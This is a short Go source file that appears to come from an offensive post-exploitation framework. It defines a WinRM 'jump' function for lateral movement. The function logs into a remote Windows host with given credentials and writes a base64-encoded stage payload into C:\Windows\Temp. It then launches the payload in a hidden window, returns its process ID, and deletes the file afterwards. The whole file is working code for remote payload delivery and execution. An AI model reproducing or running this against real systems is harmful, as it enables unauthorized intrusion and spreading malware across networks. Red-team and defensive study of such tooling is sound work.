//go:build jump_winrm && windows

package core

import (
	"context"
	"encoding/base64"
	"fmt"
	"time"

	"github.com/masterzen/winrm"
)

func jumpWinRM(ctx context.Context, s *jumpSpec, name string) (string, error) {
	https := s.Port != 5985
	ep := winrm.NewEndpoint(s.Target, s.Port, https, true,
		nil, nil, nil, time.Duration(s.Timeout)*time.Second)
	client, err := winrm.NewClient(ep, s.User, s.Pass)
	if err != nil {
		return "", err
	}
	remote := `C:\Windows\Temp\` + name
	script := fmt.Sprintf(`
$b=[Console]::In.ReadToEnd()
[IO.File]::WriteAllBytes('%s',[Convert]::FromBase64String($b))
$p=Start-Process -FilePath '%s' -PassThru -WindowStyle Hidden
Write-Output ("pid=" + $p.Id)
`, remote, remote)
	b64 := base64.StdEncoding.EncodeToString(s.Stage)
	stdout, stderr, code, err := client.RunPSWithContextWithString(
		ctx, script, b64)
	if err != nil {
		return "", err
	}
	if code != 0 {
		return stdout + stderr, fmt.Errorf("remote exit %d", code)
	}
	if !s.NoCleanup {
		_, _, _, _ = client.RunPSWithContext(ctx,
			fmt.Sprintf("Remove-Item -LiteralPath '%s' -Force -ErrorAction SilentlyContinue", remote))
	}
	return stdout, nil
}
